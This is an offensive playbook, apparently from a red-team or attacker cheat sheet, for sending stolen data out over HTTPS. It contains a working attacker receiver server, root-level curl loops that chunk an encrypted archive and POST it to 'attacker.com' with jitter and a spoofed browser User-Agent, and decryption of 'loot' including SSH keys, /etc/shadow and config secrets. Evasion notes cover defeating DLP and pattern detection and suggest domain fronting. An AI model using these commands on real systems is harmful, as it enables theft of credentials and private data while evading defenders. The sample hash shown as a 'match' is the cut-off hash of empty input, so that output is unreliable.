# HTTPS Chunked Upload Exfiltration

## Scenario
Outbound HTTPS (443) allowed through proxy. Exfiltrating encrypted data via POST uploads.

## Step 1: Setup Attacker Web Server
```bash
# Simple Python receiver
attacker$ cat > receiver.py << 'EOF'
from flask import Flask, request
import os
app = Flask(__name__)

@app.route('/upload/<filename>', methods=['POST'])
def upload(filename):
    data = request.data
    with open(f'/tmp/received/{filename}', 'wb') as f:
        f.write(data)
    return f'OK: {len(data)} bytes', 200

@app.route('/healthcheck')
def health():
    return 'OK', 200

if __name__ == '__main__':
    os.makedirs('/tmp/received', exist_ok=True)
    app.run(host='0.0.0.0', port=443, ssl_context='adhoc')
EOF
attacker$ python3 receiver.py
```

## Step 2: Verify Connectivity
```bash
root@target:~# curl -sk -o /dev/null -w "%{http_code}" https://attacker.com/healthcheck
200
```

## Step 3: Split and Upload with Jitter
```bash
root@target:~# split -b 512k /dev/shm/.work/data.enc /dev/shm/.work/chunk_

root@target:~# for chunk in /dev/shm/.work/chunk_*; do
    fname=$(basename "$chunk")
    curl -sk -X POST \
      -H "Content-Type: application/octet-stream" \
      -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
      --data-binary @"$chunk" \
      "https://attacker.com/upload/${fname}"
    delay=$((RANDOM % 30 + 10))
    echo "[$(date)] Uploaded $fname, sleeping ${delay}s"
    sleep $delay
done

[Wed Jan 15 19:15:22 EST 2025] Uploaded chunk_aa, sleeping 23s
[Wed Jan 15 19:15:45 EST 2025] Uploaded chunk_ab, sleeping 17s
```

## Step 4: Reassemble on Attacker
```bash
attacker$ cat /tmp/received/chunk_* > data_received.enc
attacker$ sha256sum data_received.enc
e3b0c44298fc1c149afbf4c8996fb924...  data_received.enc
# Matches ✅

attacker$ openssl enc -d -aes-256-cbc -pbkdf2 -in data_received.enc -out data.tar.gz -k "key_here"
attacker$ tar xzf data.tar.gz
attacker$ ls loot/
.env  id_ed25519  shadow  wp-config.php
```

## OPSEC Notes
- HTTPS traffic blends with normal web browsing
- Random delays (10-40s) avoid pattern detection
- Spoofed User-Agent matches Chrome browser
- Small chunk size (512KB) avoids DLP triggers
- Consider domain fronting for additional stealth
